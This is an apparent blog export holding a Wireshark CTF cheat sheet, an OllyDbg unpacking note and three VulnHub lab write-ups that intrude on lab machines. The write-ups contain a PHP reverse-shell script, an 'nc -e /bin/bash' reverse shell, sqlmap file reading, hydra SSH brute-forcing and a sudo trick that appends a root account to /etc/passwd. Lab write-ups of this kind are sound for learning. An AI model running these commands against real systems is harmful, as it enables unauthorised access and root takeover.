    <title>CTF与wireshark</title>
    <url>/CTF%E4%B8%8Ewireshark/</url>
    <content><![CDATA[<h2 id="0x00-Wireshark"><a href="#0x00-Wireshark" class="headerlink" title="0x00 Wireshark"></a>0x00 Wireshark</h2><ol>
<li><img src="/CTF%E4%B8%8Ewireshark/1.jfif" alt></li>
<li>wireshark的基本作用：数据包抓取、数据包筛选、关键词搜索、数据包还原、数据包提取。</li>
</ol>
<h2 id="0x01-数据包筛选"><a href="#0x01-数据包筛选" class="headerlink" title="0x01 数据包筛选"></a>0x01 数据包筛选</h2><ol>
<li><strong>ip筛选</strong></li>
<li>ip.src==ip地址  #源ip地址筛选</li>
<li>ip.dst==ip地址  #目标ip地址筛选</li>
<li></li>
<li><strong>mac筛选</strong></li>
<li>eth.addr==MAC地址  #mac地址筛选</li>
<li>eth.dst==MAC地址  #目标mac地址筛选</li>
<li></li>
<li><strong>端口筛选</strong></li>
<li>tcp.srcport==80 #筛选tcp协议源端口为80的流量包</li>
<li>tcp.dstport==80 #筛选tcp协议目的端口为80的流量包</li>
<li>udp.srcport==80 #筛选udp协议源端口为80的流量包</li>
<li>tcp.port==8080 #</li>
<li>udp.port eq 80 #</li>
<li>tcp.port&gt;=1 and tcp.port&lt;=10000 #</li>
<li></li>
<li><strong>协议筛选</strong></li>
<li>tcp</li>
<li>udp</li>
<li>arp</li>
<li>icmp</li>
<li>http</li>
<li>ftp</li>
<li>dns</li>
<li>ip</li>
<li></li>
<li><strong>关系筛选</strong></li>
<li>eq ==</li>
<li>ne !=</li>
<li>gt &gt;</li>
<li>lt &lt;</li>
<li>ge &gt;=</li>
<li>le &lt;=</li>
<li>contains #包含</li>
<li>matches #匹配给定的表达式</li>
<li></li>
<li><strong>包长度筛选</strong></li>
<li>tcp.length==100 #筛选长度为100的tcp流量包</li>
<li>udp.len&gt;=100 #筛选长度大于100的udp流量包</li>
<li>ip.len==100 #筛选长度为100的ip流量包</li>
<li>frame.len==100 #筛选长度为100的整个流量包</li>
<li></li>
<li><strong>http请求筛选</strong></li>
<li>http.request.method==GET #筛选http请求方法为GET的流量包</li>
<li>http.request.method==POST #筛选http请求方法为POST的流量包</li>
<li>http.request.uri==”/dir/1.gif” #筛选url为/dir/1.gif的流量包</li>
<li>http contains “flag”</li>
</ol>
<h2 id="0x02-关键字搜索"><a href="#0x02-关键字搜索" class="headerlink" title="0x02 关键字搜索"></a>0x02 关键字搜索</h2><ol>
<li>关键字搜索，快捷键ctrl+f</li>
<li><img src="/CTF%E4%B8%8Ewireshark/1.png" alt></li>
</ol>
<h2 id="0x03-数据流追踪"><a href="#0x03-数据流追踪" class="headerlink" title="0x03 数据流追踪"></a>0x03 数据流追踪</h2><ol>
<li>右击目的数据包——追踪流——TCP流/UDP流/SSL流/HTTP流</li>
<li><img src="/CTF%E4%B8%8Ewireshark/2.png" alt></li>
</ol>
<h2 id="0x04-数据提取"><a href="#0x04-数据提取" class="headerlink" title="0x04 数据提取"></a>0x04 数据提取</h2><ol>
<li>wireshark支持提权通过http传输（上传/下载）的文件内容</li>
<li>文件——导出对象——HTTP等</li>
<li><img src="/CTF%E4%B8%8Ewireshark/3.png" alt></li>
<li>还可以 文件——导出分组字节流</li>
</ol>
<h2 id="0x05-搜索流量包中的关键字"><a href="#0x05-搜索流量包中的关键字" class="headerlink" title="0x05 搜索流量包中的关键字"></a>0x05 搜索流量包中的关键字</h2><ol>
<li>直接记事本打开流量包，搜索关键字，如flag、ctf等等</li>
</ol>
<h2 id="0x06-统计"><a href="#0x06-统计" class="headerlink" title="0x06 统计"></a>0x06 统计</h2><ol>
<li>统计——协议分级——查看当前数据包中包含哪些协议</li>
<li><img src="/CTF%E4%B8%8Ewireshark/4.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>脱壳二</title>
    <url>/%E8%84%B1%E5%A3%B3%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li>工具：PEID（查壳）、OllyDbg（调试）、OllyDbg自带的插件（脱壳）、LordPE（脱壳）、ImportREC（修复）</li>
<li>加壳的程序</li>
</ol>
<h2 id="0x10-Nspack壳"><a href="#0x10-Nspack壳" class="headerlink" title="0x10 Nspack壳"></a>0x10 Nspack壳</h2><ol>
<li>查壳</li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/1.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/3.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/2.png" alt></li>
<li>OD载入，先看看pushfd，pushad</li>
<li>pushad: 将所有的32位通用寄存器压入堆栈</li>
<li>pusha:将所有的16位通用寄存器压入堆栈</li>
<li>pushfd:然后将32位标志寄存器EFLAGS压入堆栈</li>
<li>pushf::将的16位标志寄存器EFLAGS压入堆栈</li>
<li>popad:将所有的32位通用寄存器取出堆栈</li>
<li>popa:将所有的16位通用寄存器取出堆栈</li>
<li>popfd:将32位标志寄存器EFLAGS取出堆栈</li>
<li>popf:将16位标志寄存器EFLAGS取出堆栈</li>
<li>F8，ESP突变</li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/4.png" alt></li>
<li>右击ESP数值——数值窗口中跟随——数据窗口中右击目的地址——断点——硬件访问——word，运行</li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/5.png" alt></li>
<li>F8，到了一个不明觉厉的画面</li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/6.png" alt></li>
<li>右击反汇编窗口——分析——从模块中删除分析</li>
<li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/7.png" alt></li>
<li>到OEP</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li>ximo早期发的脱壳基础</li>
<li><a href="https://www.52pojie.cn/" target="_blank" rel="noopener">https://www.52pojie.cn/</a></li>
</ol>
]]></content>
      <tags>
        <tag>MISC</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之Brainpan_III</title>
    <url>/vulnhub%E4%B9%8BBrainpan-III/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li>kali：192.168.100.4</li>
<li>netdiscover -i eth0 -r 192.168.100.0/24</li>
<li>靶机：192.168.100.32——一个二进制文件</li>
</ol>
<h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol>
<li>nmap扫端口：nmap -sT -p- 192.168.100.32</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/1.png" alt></li>
<li>nc连一下1337端口：nc -v 192.168.100.32 1337</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/2.png" alt></li>
<li>翻译一下（嘘）</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/3.png" alt></li>
<li>爆破是不可能的，只能模糊测试</li>
<li>先（搜）思（大）考（佬）一（博）下（客），一般变量中代表数字或字符的：</li>
<li>%d：整数</li>
<li>%o：八进制</li>
<li>%x：十六进制</li>
<li>%u：无符号十进制</li>
<li>%c：字符</li>
<li>%s：字符串</li>
<li>%f：实数</li>
<li>%e：指数</li>
<li>%p：指针</li>
<li>……</li>
<li>输入%d.%d.%d.%d（回车），得到一串不明数字，刚好 数字.数字.数字.数字，四位数7027</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/4.png" alt></li>
<li>输入7027，O（大）J（佬）B（真）K（棒）</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/5.png" alt></li>
<li>有个shell选项，发现基本啥都执行不了，废shell</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/6.png" alt></li>
</ol>
<h2 id="0x02-分支一"><a href="#0x02-分支一" class="headerlink" title="0x02 分支一"></a>0x02 分支一</h2><ol>
<li>退出shell，选显示代码存储库，刚才有个8080端口，现在已经open</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/7.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/8.png" alt></li>
<li>访问<a href="http://192.168.100.32:8080/" target="_blank" rel="noopener">http://192.168.100.32:8080/</a></li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/9.png" alt></li>
<li>dirsearch扫目录</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/10.png" alt></li>
<li>访问robots.txt</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/11.png" alt></li>
<li>得一张动态图</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/12.png" alt></li>
<li>dirb扫目录,</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/13.png" alt></li>
<li>访问目录/repo/</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/14.png" alt></li>
<li>把文件都下载下来，查看文件内容</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/15.png" alt></li>
<li>IDA打开report，CTRL+F12：函数调用关系图</li>
</ol>
<p><strong>main</strong></p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // ST14_4
  char dest; // [esp+18h] [ebp-68h]
  unsigned int v6; // [esp+7Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  if ( argc &gt; 2 )
  {
    cb();
    strcpy(&amp;dest, argv[1]);
    v4 = atoi(argv[2]);
    P = (int)REPORT;
    N = (void *)(-sysconf(30) &amp; (unsigned int)REPORT);
    mprotect(N, 0x1F4u, 7);
    if ( v4 )
    {
      sanitize(&amp;dest);
      encrypt(&amp;dest);
      record_data(&amp;dest);
    }
    else
    {
      record_data(&amp;dest);
      record_id(&amp;dest);
    }
    printf(&quot;[+] RECORDED [%s]\n&quot;, &amp;dest);
    result = 0;
  }
  else
  {
    printf(&quot;%s &lt;report&gt; [0|1]\n&quot;, *argv);
    result = 0;
  }
  return result;
}</code></pre><p><strong>sanitize</strong></p>
<pre><code>int __cdecl sanitize(char *s)
{
  size_t i; // [esp+18h] [ebp-10h]
  int v3; // [esp+1Ch] [ebp-Ch]

  v3 = 0;
  for ( i = 0; i &lt; strlen(s); ++i )
  {
    if ( !isalpha(s[i]) )
    {
      s[i] = 63;
      ++v3;
    }
  }
  return v3;
}</code></pre><p><strong>encrypt</strong></p>
<pre><code>size_t __cdecl encrypt(char *s)
{
  unsigned int v1; // eax
  size_t result; // eax
  unsigned int i; // [esp+18h] [ebp-10h]
  int v4; // [esp+1Ch] [ebp-Ch]

  v1 = time(0);
  srand(v1);
  v4 = rand() % 9000 + 1000;
  for ( i = 0; ; ++i )
  {
    result = strlen(s);
    if ( i &gt;= result )
      break;
    s[i] ^= v4;
  }
  return result;
}</code></pre><p><strong>record_data</strong></p>
<pre><code>int __cdecl record_data(const char *a1)
{
  char *v1; // eax
  time_t timer; // [esp+2Ch] [ebp-5Ch]
  FILE *stream; // [esp+30h] [ebp-58h]
  struct tm *tp; // [esp+34h] [ebp-54h]
  char s; // [esp+3Ah] [ebp-4Eh]
  char dest[4]; // [esp+54h] [ebp-34h]
  int v8; // [esp+58h] [ebp-30h]
  int v9; // [esp+5Ch] [ebp-2Ch]
  int v10; // [esp+60h] [ebp-28h]
  int v11; // [esp+64h] [ebp-24h]
  __int16 v12; // [esp+68h] [ebp-20h]
  unsigned int v13; // [esp+7Ch] [ebp-Ch]

  v13 = __readgsdword(0x14u);
  stream = 0;
  time(&amp;timer);
  tp = localtime(&amp;timer);
  strftime(&amp;s, 0x1Au, &quot;%Y%m%d%H%M%S&quot;, tp);
  memset(dest, 0, 0x28u);
  *(_DWORD *)dest = 1836017711;
  v8 = 1851862885;
  v9 = 1769172577;
  v10 = 1346720303;
  v11 = 1398035023;
  v12 = 47;
  strcat(dest, &amp;s);
  v1 = &amp;dest[strlen(dest)];
  *(_DWORD *)v1 = 1885696558;
  v1[4] = 0;
  printf(&quot;[+] WRITING REPORT TO %s\n&quot;, dest);
  stream = fopen(dest, &quot;w&quot;);
  fputs(a1, stream);
  fclose(stream);
  strncpy(REPORT, a1, 0x64u);
  return feedback();
}</code></pre><p><strong>record_id</strong></p>
<pre><code>int __cdecl record_id(char *src)
{
  char dest; // [esp+19h] [ebp-Fh]
  void (*v3)(void); // [esp+1Ch] [ebp-Ch]

  v3 = (void (*)(void))feedback;
  strcpy(&amp;dest, src);
  v3();
  return atoi(&amp;dest);
}</code></pre><p><strong>feedback</strong></p>
<pre><code>int feedback()
{
  puts(&quot;[+] DATA SUCCESSFULLY ENCRYPTED&quot;);
  return puts(&quot;[+] DATA SUCCESSFULLY RECORDED&quot;);
}</code></pre><h2 id="0x03-分支二"><a href="#0x03-分支二" class="headerlink" title="0x03 分支二"></a>0x03 分支二</h2><ol>
<li>选命令3</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/16.png" alt></li>
<li>输入N个%x.</li>
<li>得到一串：SESSION: bf9d8bbc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.bf9d8d0a.0.b76ef000.b76efac0.b76f0898.b7543940.b75b50b5.b76efac0.59.4e.59.b76ef8a0.b76ef000.b76efac0.3.e5.</li>
<li>16进制解码</li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/17.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BBrainpan-III/18.png" alt></li>
<li>关键字符Y、N、Y</li>
<li>未完</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://github.com/ctfhacker/ctf-writeups/tree/master/vulnhub/brainpan3" target="_blank" rel="noopener">https://github.com/ctfhacker/ctf-writeups/tree/master/vulnhub/brainpan3</a></li>
<li><a href="https://r3v3rs3r.wordpress.com/2015/09/13/brainpan-3-the-write-up/" target="_blank" rel="noopener">https://r3v3rs3r.wordpress.com/2015/09/13/brainpan-3-the-write-up/</a></li>
<li><a href="https://blog.techorganic.com/2015/10/13/brainpan-3-solution/" target="_blank" rel="noopener">https://blog.techorganic.com/2015/10/13/brainpan-3-solution/</a></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之Bitbot.VulnVM-disk1</title>
    <url>/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li>kali：192.168.100.4</li>
<li>靶机：DHCP</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/1.png" alt></li>
</ol>
<h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol>
<li>netdiscover -i eth0 -r 192.168.100.0/24 #-i 网卡； -r 范围</li>
<li>找到靶机ip为192.168.100.31</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/2.png" alt></li>
<li>端口扫描：nmap -A 192.168.100.31</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/3.png" alt></li>
<li>存活22,80,111端口</li>
<li>访问80端口</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/4.png" alt></li>
<li>点击访问，回显403</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/5.png" alt></li>
<li>扫描目录：python3 dirsearch.py -e * -u <a href="http://192.168.100.31/" target="_blank" rel="noopener">http://192.168.100.31/</a></li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/6.png" alt></li>
<li>访问admin.php，是个后台</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/7.png" alt></li>
<li>抓包，丢到sqlmap跑</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/8.png" alt></li>
<li>sqlmap -r 1.txt，没跑到注入</li>
</ol>
<h2 id="0x02-继续"><a href="#0x02-继续" class="headerlink" title="0x02 继续"></a>0x02 继续</h2><ol>
<li>dirb扫目录：dirb <a href="http://192.168.100.31/" target="_blank" rel="noopener">http://192.168.100.31/</a> /usr/share/dirb/wordlists/big.txt</li>
<li>也是没啥</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/9.png" alt></li>
<li>dirbuster扫目录</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/10.png" alt></li>
<li>依次访问各文件</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/11.png" alt></li>
<li>根（看）据（大）靶（佬）场（博）提（客）示</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/12.png" alt></li>
<li>搜关键字：bitbot botnet</li>
<li><a href="https://www.exploit-db.com/exploits/27750" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/27750</a></li>
<li><a href="https://threatvector.cylance.com/en_us/home/a-study-in-bots-bitbot.html" target="_blank" rel="noopener">https://threatvector.cylance.com/en_us/home/a-study-in-bots-bitbot.html</a></li>
<li>查看到gate2.php文件与刚扫目录扫出来的相符</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/13.png" alt></li>
<li>有注入，访问 <a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info</a></li>
<li>sqlmap -u “<a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;</a></li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/14.png" alt></li>
<li>读服务器文件：sqlmap -u “<a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;</a> –dbms=mysql –method=GET –file-read=/var/www/admin.php</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/15.png" alt></li>
<li>读config.php</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/16.png" alt></li>
<li>得账号：botter</li>
<li>密码：IF I CAME UP WITH UNIQUE PASSWORDS, I WOULD BE HOME BY NOW</li>
<li>登录web</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/17.png" alt></li>
<li>web里存在命令执行界面</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/18.png" alt></li>
<li>kali本地使用Python临时搭建http服务器，目的就是让靶机访问临时服务器来下载木马文件。</li>
<li>python -m simplehttpserver 8000  # ctrl+c 关闭</li>
<li>临时http服务器准备个php的反弹shell脚本：<pre><code>&lt;?php set_time_limit(0);$fp=@fsockopen(&quot;本地主机IP&quot;,8888);while(!feof($fp)){fputs($fp,&quot;shell:&quot;);$shell=fgets($fp);$message=`$shell`;fputs($fp,$message);}fclose($fp);?&gt;</code></pre></li>
<li>DOWN <a href="http://192.168.100.4:8000/nc.php" target="_blank" rel="noopener">http://192.168.100.4:8000/nc.php</a>  #点击add，没反应，半天没反弹shell，php怎么执行嘛</li>
<li>又上传了py的shell、exe的shell，都不行。</li>
</ol>
<h2 id="0x03-再来"><a href="#0x03-再来" class="headerlink" title="0x03 再来"></a>0x03 再来</h2><ol>
<li>重启靶机之后，offline的状态变成online了，原来如此，之前的都在瞎搞了。</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/19.png" alt></li>
<li>kali开启监听：nc -lvp 8888，又上传前面的php反弹shell脚本，还是没反弹。</li>
<li>上传Python脚本</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/20.png" alt></li>
<li>试了N次，终于行了</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/21.png" alt></li>
<li>nc正连shell</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/22.png" alt></li>
<li>找到当前用户当前目录下有个gen.sh并读取它</li>
<li>一步步理解gen.sh的作用</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/23.png" alt></li>
<li>最后的结果为addr:192.168.100.310.XX，输出到passwd来改密码，XX不确定</li>
<li>列出部分密码，用hydra爆破</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/24.png" alt></li>
<li>hydra -f -l root -P passwd.txt -e nsr ssh://192.168.100.31 #-f 账号密码正确就退出</li>
<li>得密码</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/25.png" alt></li>
<li>登录ssh</li>
<li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/26.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://frequentlyinaccurate.net/2016/08/vulnhub-flipping-bitbot/" target="_blank" rel="noopener">https://frequentlyinaccurate.net/2016/08/vulnhub-flipping-bitbot/</a></li>
<li><a href="http://www.cyberry.co.uk/vulnhub/bot-challenges-flipping-bitbot/" target="_blank" rel="noopener">http://www.cyberry.co.uk/vulnhub/bot-challenges-flipping-bitbot/</a></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
        <tag>僵尸网络</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之21LTLTR_Scene_1</title>
    <url>/vulnhub%E4%B9%8B21LTLTR-Scene-1/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li><a href="https://www.vulnhub.com/entry/21ltr-scene-1,3/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/21ltr-scene-1,3/</a></li>
<li>kali：192.168.2.1</li>
<li>因为靶场ip是静态ip：192.168.2.120</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/1.png" alt></li>
<li>所以虚拟机配置网卡</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/2.png" alt></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/3.png" alt></li>
</ol>
<h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol>
<li>nmap -sV 192.168.2.120 -p 1-65535</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/4.png" alt></li>
<li>访问<a href="http://192.168.2.120/" target="_blank" rel="noopener">http://192.168.2.120/</a></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/5.png" alt></li>
<li>查看网页源代码</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/6.png" alt></li>
<li>得username:logs password:zg]E-b0]+8:(58G</li>
<li>nmap扫到端口21、22、80，尝试登陆ftp</li>
<li>ftp 192.168.2.120</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/7.png" alt></li>
<li>?  #查看帮助命令</li>
<li>dir 或 ls  #列目录</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/8.png" alt></li>
<li>有敏感文件backup_log.php，下载下来</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/9.png" alt></li>
<li>读backup_log.php</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/10.png" alt></li>
<li>emmm，没啥东西，测试一下<a href="http://192.168.2.120/123456789" target="_blank" rel="noopener">http://192.168.2.120/123456789</a></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/11.png" alt></li>
<li>重新下载backup_log.php，随便改个名1.php，再读</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/12.png" alt></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/13.png" alt></li>
<li>没啥变化，扫目录</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/14.png" alt></li>
<li>存在/logs/，访问403，继续扫 <a href="http://192.168.2.120/logs/" target="_blank" rel="noopener">http://192.168.2.120/logs/</a> 目录，毛都没</li>
<li>尝试访问 <a href="http://192.168.2.120/logs/backup_log.php" target="_blank" rel="noopener">http://192.168.2.120/logs/backup_log.php</a> ，有东西</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/15.png" alt></li>
<li>没啥有用的东西~</li>
<li>ssh登录，失败！告辞。</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/17.png" alt></li>
</ol>
<h2 id="0x02-再来"><a href="#0x02-再来" class="headerlink" title="0x02 再来"></a>0x02 再来</h2><ol>
<li>nmap -sT -p0-65535 192.168.2.120 #之前nmap试过扫全端口，就是扫不出来，有毒</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/16.png" alt></li>
<li>scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</li>
<li>使用nc -n -v 192.168.2.120 10001 #空白shell，连接192.168.2.120的10001端口 -v：显示详情，-n：指定ip地址，不通过DNS，（PS：10001有时open，有时close，很坑）</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/18.png" alt></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/19.png" alt></li>
<li><strong>插曲：nc扫描端口</strong></li>
<li>nc -v -n -z IP 1-65535 #tcp</li>
<li>nc -v -n -z -u IP 1-65535 #udp</li>
<li>写入php代码</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/20.png" alt></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/21.png" alt></li>
<li>先打开监听，nc -lvp 8888</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/22.png" alt></li>
<li>反弹shell，nc -e /bin/bash 192.168.2.1 8888</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/23.png" alt></li>
<li>连接到反弹shell</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/24.png" alt></li>
<li>获取交互shell</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/25.png" alt></li>
</ol>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><ol>
<li>目前得到的shell是/bin/false，切换不了</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/26.png" alt></li>
<li>有3个普通用户，翻系统文件，查找777文件：find / -perm 777 -type f</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/27.png" alt></li>
<li>找到个id_rsa，authorized_keys，查看</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/28.png" alt></li>
<li>复制，保存到本地，私钥权限设为600，使用私钥登录，碰到一<strong>坑</strong></li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/29.png" alt></li>
<li>删除 rm -rf ~/.ssh/known_hosts，或执行ssh-keygen -f “/root/.ssh/known_hosts” -R”192.168.2.120”，再登录</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/30.png" alt></li>
<li>id #查看权限</li>
<li>sudo -l #列出哪些命令是以root权限执行的</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/31.png" alt></li>
<li>openssl passwd生成密码</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/33.png" alt></li>
<li>openssl passwd -1 -salt admin password</li>
<li>#-1：是数字1，基于MD5的密码算法</li>
<li>#-salt：加盐，admin</li>
<li>#password：密码</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/32.png" alt></li>
<li>使用具有root权限的cat命令来编辑/etc/passwd：sudo /usr/bin/cat &gt;&gt;/etc/passwd</li>
<li>添加admin:$1$admin$mZhVCYpQb/nUmzdFCQFBs0:0:0:/root:/bin/bash</li>
<li>ctrl+c</li>
<li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/34.png" alt></li>
<li>得root shell。</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
